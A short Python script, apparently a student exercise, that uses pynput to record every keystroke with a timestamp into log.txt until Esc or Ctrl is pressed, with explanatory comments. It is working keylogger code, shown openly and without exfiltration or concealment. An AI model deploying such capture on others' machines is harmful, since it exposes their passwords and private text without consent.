#Nneoma Nosike, tqe8fn

from pynput.keyboard import Key, Listener
import logging
#installed these libraries to create a keylogger



logging.basicConfig(filename= "log.txt",
                    level=logging.DEBUG,
                    style= "{",
                    datefmt= '%Y-%m-%d %H:%M:%S',
                    format='[{asctime}]: {message}')
#information about the file name using for text and time when it was logged in


def on_press(key) -> None:
    logging.info(str(key))
    #when you type a char on the keyboard, it becomes a string and recorded on keylogger

def on_release(key) -> bool:
    if key == Key.esc or key == Key.ctrl_r or key == Key.ctrl_l:
        return False
    #case that checks if you press the esc button or ctrl + c (ctrl on left/right side), terminate program

try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    #reads in previous written functions and records every keystroke typed
except KeyboardInterrupt:
    print("Keyboard terminated!")
    #try/exceot block handles when the listener stops